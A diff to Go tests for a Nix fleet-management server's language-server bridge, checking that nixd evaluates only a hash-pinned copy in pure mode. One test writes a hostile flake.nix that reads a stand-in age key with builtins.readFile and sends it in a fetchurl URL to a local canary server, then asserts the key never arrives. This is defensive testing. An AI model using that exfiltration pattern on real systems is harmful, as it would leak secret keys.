@@ -10,9 +10,12 @@ import (
 	"net/http/cookiejar"
 	"net/http/httptest"
 	"os"
+	"os/exec"
 	"path/filepath"
+	"slices"
 	"strconv"
 	"strings"
+	"sync"
 	"syscall"
 	"testing"
 	"testing/fstest"
@@ -61,7 +64,7 @@ func fakeNixd() {
 		switch {
 		case m["method"] == "initialize":
 			caps := m["params"].(map[string]any)["capabilities"].(map[string]any)
-			send(map[string]any{"jsonrpc": "2.0", "id": m["id"], "result": map[string]any{"capabilities": map[string]any{}, "sawConfigCapability": caps["workspace"].(map[string]any)["configuration"]}})
+			send(map[string]any{"jsonrpc": "2.0", "id": m["id"], "result": map[string]any{"capabilities": map[string]any{}, "sawConfigCapability": caps["workspace"].(map[string]any)["configuration"], "nixConfig": os.Getenv("NIX_CONFIG")}})
 			send(map[string]any{"jsonrpc": "2.0", "id": 99, "method": "workspace/configuration", "params": map[string]any{"items": []any{map[string]any{"section": "nixd"}}}})
 		case m["id"] == float64(99):
 			send(map[string]any{"jsonrpc": "2.0", "method": "test/config", "params": m["result"]})
@@ -325,10 +328,16 @@ func TestStaticUI(t *testing.T) {
 	}
 }
 
+// nixd evaluates a NAR-hash-pinned export of the working copy in pure mode, as
+// the model does: fleet code must not read the server's files, such as the age key.
 func TestLSPBridgeAnswersConfiguration(t *testing.T) {
 	e := newEnv(t)
 	e.login(t)
+	if _, err := e.svc.Write("flake.nix", "{ outputs = _: { }; }", ""); err != nil { // not committed
+		t.Fatal(err)
+	}
 	t.Setenv("FAKE_NIXD", "1") // inherited by the re-executed test binary acting as nixd
+	t.Setenv("NIX_CONFIG", "access-tokens = github.com=x")
 	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
 	defer cancel()
 	u, _ := http.NewRequest("GET", e.srv.URL, nil)
@@ -340,6 +349,7 @@ func TestLSPBridgeAnswersConfiguration(t *testing.T) {
 	defer c.CloseNow()
 	c.Write(ctx, websocket.MessageText, []byte(`{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"capabilities":{}}}`))
 	var gotInit, gotConfig bool
+	var export string
 	for !gotInit || !gotConfig {
 		_, msg, err := c.Read(ctx)
 		if err != nil {
@@ -349,13 +359,82 @@ func TestLSPBridgeAnswersConfiguration(t *testing.T) {
 		switch {
 		case strings.Contains(s, `"sawConfigCapability":true`):
 			gotInit = true
+			if !strings.Contains(s, `"nixConfig":"access-tokens = github.com=x\npure-eval = true"`) {
+				t.Fatalf("nixd's Nix settings: %s", s)
+			}
 		case strings.Contains(s, "test/config"):
-			gotConfig = strings.Contains(s, "nixosConfigurations") && strings.Contains(s, "homeConfigurations") && strings.Contains(s, e.svc.Repo.Dir)
-			if !gotConfig {
+			var cfg struct {
+				Params []struct {
+					Nixpkgs struct{ Expr string }
+					Options map[string]struct{ Expr string }
+				}
+			}
+			if json.Unmarshal(msg, &cfg) != nil || len(cfg.Params) != 1 || len(cfg.Params[0].Options) != 3 {
 				t.Fatalf("config reply: %s", s)
 			}
+			exprs := []string{cfg.Params[0].Nixpkgs.Expr}
+			for _, o := range cfg.Params[0].Options {
+				exprs = append(exprs, o.Expr)
+			}
+			for _, x := range exprs {
+				ref, _, _ := strings.Cut(strings.TrimPrefix(x, `let f = builtins.getFlake "`), `"`)
+				src, hash, _ := strings.Cut(strings.TrimPrefix(ref, "path:"), "?")
+				if hash != "narHash=sha256-fake" || strings.Contains(x, e.svc.Repo.Dir) || export != "" && src != export {
+					t.Fatalf("not the pinned export of the working copy: %s", x)
+				}
+				export = src
+			}
+			if !strings.Contains(cfg.Params[0].Nixpkgs.Expr, `import f.inputs.nixpkgs { system = "`+core.LocalSystem()+`"; }`) ||
+				!strings.Contains(s, "nixosConfigurations") || !strings.Contains(s, "homeConfigurations") {
+				t.Fatalf("config reply: %s", s)
+			}
+			gotConfig = true
 		case strings.Contains(s, `"id":1`):
 			t.Fatalf("initialize did not advertise workspace/configuration: %s", s)
+		}
+	}
+	if b, err := os.ReadFile(filepath.Join(export, "flake.nix")); err != nil || string(b) != "{ outputs = _: { }; }" {
+		t.Fatalf("export of the working copy: %q %v", b, err)
+	}
+	c.Close(websocket.StatusNormalClosure, "")
+	for i := 0; ; i++ { // removed once nixd is gone
+		if _, err := os.Stat(export); os.IsNotExist(err) {
+			break
+		}
+		if i == 100 {
+			t.Fatal("the export outlived the editor session")
+		}
+		time.Sleep(50 * time.Millisecond)
+	}
+}
+
+// Without a pinned export (here nix is missing) nixd gets nothing to evaluate:
+// it never falls back to the working copy itself.
+func TestLSPWithoutPinnedFlakeOnlyFormats(t *testing.T) {
+	e := newEnv(t)
+	e.login(t)
+	e.svc.Jobs.Nix = filepath.Join(t.TempDir(), "missing-nix")
+	t.Setenv("FAKE_NIXD", "1")
+	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+	defer cancel()
+	u, _ := http.NewRequest("GET", e.srv.URL, nil)
+	hdr := http.Header{"Cookie": {cookieHeader(e.client.Jar.Cookies(u.URL))}}
+	c, _, err := websocket.Dial(ctx, "ws"+strings.TrimPrefix(e.srv.URL, "http")+"/api/lsp", &websocket.DialOptions{HTTPHeader: hdr})
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer c.CloseNow()
+	c.Write(ctx, websocket.MessageText, []byte(`{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"capabilities":{}}}`))
+	for {
+		_, msg, err := c.Read(ctx)
+		if err != nil {
+			t.Fatal(err)
+		}
+		if s := string(msg); strings.Contains(s, "test/config") {
+			if strings.Contains(s, "getFlake") || !strings.Contains(s, "nixfmt") {
+				t.Fatalf("config reply: %s", s)
+			}
+			return
 		}
 	}
 }
@@ -439,6 +518,138 @@ func TestLSPConnectionsAreCapped(t *testing.T) {
 	}
 	if _, resp, err := websocket.Dial(ctx, url, &websocket.DialOptions{HTTPHeader: hdr}); err == nil || resp == nil || resp.StatusCode != 503 {
 		t.Fatalf("connection over the cap: %v %v", err, resp)
+	}
+}
+
+// With real Nix and nixd (CI's Real Nix job): the editor's language server
+// completes the options of the working copy's NixOS configuration, and an
+// edited flake.nix there cannot send the server's age key out.
+func TestLanguageServerIsPureWithRealNix(t *testing.T) {
+	if os.Getenv("NIXMGR_NIX_TESTS") == "" {
+		t.Skip("needs real Nix and nixd: set NIXMGR_NIX_TESTS=1")
+	}
+	var mu sync.Mutex
+	var requests []string
+	canary := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		mu.Lock()
+		defer mu.Unlock()
+		requests = append(requests, r.URL.Path)
+	}))
+	defer canary.Close()
+	got := func() string {
+		mu.Lock()
+		defer mu.Unlock()
+		return strings.Join(requests, " ")
+	}
+	key := filepath.Join(t.TempDir(), "sops-age-key")
+	if err := os.WriteFile(key, []byte("AGE-SECRET-KEY-1TEST"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	e := newEnv(t)
+	e.login(t)
+	e.svc.Jobs.Nix = "nix"
+	nixdLog := filepath.Join(t.TempDir(), "nixd.log")
+	e.s.Nixd = []string{"sh", "-c", `exec nixd 2>>"$0"`, nixdLog}
+	t.Cleanup(func() {
+		if b, _ := os.ReadFile(nixdLog); t.Failed() {
+			t.Logf("nixd's log:\n%s", b)
+		}
+	})
+	// Each option source must evaluate: nixd answers no completion while one has no value.
+	const others = `homeConfigurations.test.options = { }; darwinConfigurations.test.options = { };`
+	configs := `{ test.options.canary = { }; }`
+	hash, err := e.svc.Write("flake.nix", `{ outputs = _: { nixosConfigurations = `+configs+`; `+others+` }; }`, "")
+	if err != nil {
+		t.Fatal(err)
+	}
+	git := exec.Command("sh", "-c", "git add flake.nix && git -c user.name=t -c user.email=t@example.invalid commit -qm fleet")
+	git.Dir = e.svc.Repo.Dir
+	if out, err := git.CombinedOutput(); err != nil {
+		t.Fatalf("%v: %s", err, out)
+	}
+	if got := complete(t, openEditor(t, e)); !slices.Contains(got, "canary") {
+		t.Fatalf("completions from the fleet's options: %q", got)
+	}
+	// What an edit token can write: not committed, and nobody reads an error. With a
+	// hash pure mode fetches, so only the forbidden read can stop the key going out.
+	fetching := func(path string) string {
+		fetch := `builtins.fetchurl { url = "` + canary.URL + path + `"; sha256 = "` + strings.Repeat("0", 52) + `"; }`
+		return `{ outputs = _: { nixosConfigurations = builtins.seq (` + fetch + `) ` + configs + `; ` + others + ` }; }`
+	}
+	if hash, err = e.svc.Write("flake.nix", fetching("/control"), hash); err != nil {
+		t.Fatal(err)
+	}
+	openEditor(t, e) // a fetch is part of the evaluation openEditor waits for
+	if r := got(); r != "/control" {
+		t.Fatalf("a fetch from fleet code should get out: %q", r)
+	}
+	if _, err := e.svc.Write("flake.nix", fetching(`/${builtins.readFile "`+key+`"}`), hash); err != nil {
+		t.Fatal(err)
+	}
+	openEditor(t, e)
+	if r := got(); r != "/control" {
+		t.Fatalf("fleet code read the age key and sent it out: %q", r)
+	}
+}
+
+// openEditor opens the editor's language server like the Code view and waits
+// until it has evaluated the option sources of its configuration.
+func openEditor(t *testing.T, e *env) *websocket.Conn {
+	t.Helper()
+	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Minute)
+	defer cancel()
+	u, _ := http.NewRequest("GET", e.srv.URL, nil)
+	hdr := http.Header{"Cookie": {cookieHeader(e.client.Jar.Cookies(u.URL))}}
+	c, _, err := websocket.Dial(ctx, "ws"+strings.TrimPrefix(e.srv.URL, "http")+"/api/lsp", &websocket.DialOptions{HTTPHeader: hdr})
+	if err != nil {
+		t.Fatal(err)
+	}
+	t.Cleanup(func() { c.CloseNow() })
+	for _, m := range []string{
+		`{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"processId":null,"rootUri":null,"capabilities":{"window":{"workDoneProgress":true}}}}`,
+		`{"jsonrpc":"2.0","method":"initialized","params":{}}`,
+	} {
+		c.Write(ctx, websocket.MessageText, []byte(m))
+	}
+	pending := []string{`"evaluated nixos"`, `"evaluated home-manager"`, `"evaluated nix-darwin"`} // nixd's progress messages
+	for len(pending) > 0 {
+		_, msg, err := c.Read(ctx)
+		if err != nil {
+			t.Fatalf("waiting for nixd to evaluate %v: %v", pending, err)
+		}
+		pending = slices.DeleteFunc(pending, func(p string) bool { return strings.Contains(string(msg), p) })
+	}
+	return c
+}
+
+// complete returns what the language server completes for "canar" in an attribute set.
+func complete(t *testing.T, c *websocket.Conn) []string {
+	t.Helper()
+	ctx, cancel := context.WithTimeout(context.Background(), time.Minute)
+	defer cancel()
+	for _, m := range []string{
+		`{"jsonrpc":"2.0","method":"textDocument/didOpen","params":{"textDocument":{"uri":"file:///fleet/host.nix","languageId":"nix","version":1,"text":"{ canar = { }; }"}}}`,
+		`{"jsonrpc":"2.0","id":"complete","method":"textDocument/completion","params":{"textDocument":{"uri":"file:///fleet/host.nix"},"position":{"line":0,"character":7}}}`,
+	} {
+		c.Write(ctx, websocket.MessageText, []byte(m))
+	}
+	for {
+		_, msg, err := c.Read(ctx)
+		if err != nil {
+			t.Fatalf("waiting for completions: %v", err)
+		}
+		var reply struct {
+			ID     string // nixd's own requests have numbers
+			Result struct{ Items []struct{ Label string } }
+		}
+		if json.Unmarshal(msg, &reply) != nil || reply.ID != "complete" {
+			continue
+		}
+		var labels []string
+		for _, it := range reply.Result.Items {
+			labels = append(labels, it.Label)
+		}
+		return labels
 	}
 }
 
